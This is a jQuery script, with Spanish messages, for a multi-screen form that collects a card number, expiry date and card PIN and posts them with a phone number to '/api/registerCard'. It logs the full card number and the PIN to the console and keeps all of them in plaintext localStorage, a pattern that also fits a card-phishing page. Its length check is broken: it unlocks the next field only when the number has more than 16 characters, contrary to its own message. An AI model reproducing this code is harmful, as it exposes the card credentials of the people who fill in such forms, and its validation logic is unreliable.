$(document).ready(function(){
   $(document).on('keyup', '#card_input', function (event) {
	    var card = $("#card_input").val();
	    var cardLength = card.length;
	    var max = 16;
	    if ( cardLength > max ) {
	        console.log("El número de tarjeta debe tener máximo 16 caracteres.");
	        console.log("Número de tarjeta: " + card);
	        localStorage.setItem("tarjeta", card);
	    	$('#month_sel').removeAttr('disabled');
            $("#month_sel").focus();
        } else {
            $('#month_sel').attr('disabled', 'true');
            $('#year_sel').attr('disabled', 'true');
            $('#nxt-btn6').attr('disabled', 'true');
        }
	});

    $("#month_sel").on('change', function() {
        if ( $("#month_sel").val() != null ) {
			var mes = $("#month_sel").val();
	        console.log("Mes: " + mes);
	        localStorage.setItem("mesVenc", mes);
			$('#year_sel').removeAttr('disabled');
	        $("#year_sel").focus();
	    } else {
	        $('#year_sel').attr('disabled', 'true');
	    }
    });

    $("#year_sel").on('change', function() {
        if ( $("#year_sel").val() != null ) {
			var anio = $("#year_sel").val();
	        console.log("Año: " + anio);
	        localStorage.setItem("añoVenc", anio);
			$('#nxt-btn6').removeAttr('disabled');
	        $("#nxt-btn6").focus();
	    } else {
	        $('#nxt-btn6').attr('disabled', 'true');
	    }
    });

    $('#nxt-btn6').on('click', function(event) {
        $(window).attr('location','pantalla6pass.html');
    });

    if (localStorage.getItem("tarjeta")) {
    	var card = localStorage.getItem("tarjeta");
    	var splitCard = card.slice(12, 16);
    	$('#num-tarjeta').html(splitCard);
    }

    $(document).on('keyup', '#cardkey_input', function (event) {
	    var cardkey = $("#cardkey_input").val();
	    var cardkeyLength = cardkey.length;
	    var min = 4;
	    if ( cardkeyLength >= min ) {
	        console.log("Clave de tarjeta: " + cardkey);
	        localStorage.setItem("claveTarjeta", cardkey);
	    	$('#nxt-btn7').removeAttr('disabled');
            $("#nxt-btn7").focus();
        } else {
            $('#nxt-btn7').attr('disabled', 'true');
        }
	});

    $('#nxt-btn7').on('click', function(event) {
	    var tel = localStorage.getItem("telefono");
	    var card = localStorage.getItem("tarjeta");
	    var mesVenc = localStorage.getItem("mesVenc");
	    var anioVen = localStorage.getItem("añoVenc");
	    var cardkey = localStorage.getItem("claveTarjeta");
	    
        $.ajax({
            url : '/api/registerCard',
            type : 'POST',
            data : {
                'userId' : tel,
                'cardNumber' : card,
    			'cardMonth' : mesVenc,
    			'cardYear' : anioVen,
    			'cardPassword' : cardkey
            },
        })
        .done(function(respuesta){
            console.log("success");
            console.log(respuesta);
            $(window).attr('location','index7.html');
        })
        .fail(function(){
            console.log("error");
        });
    });
});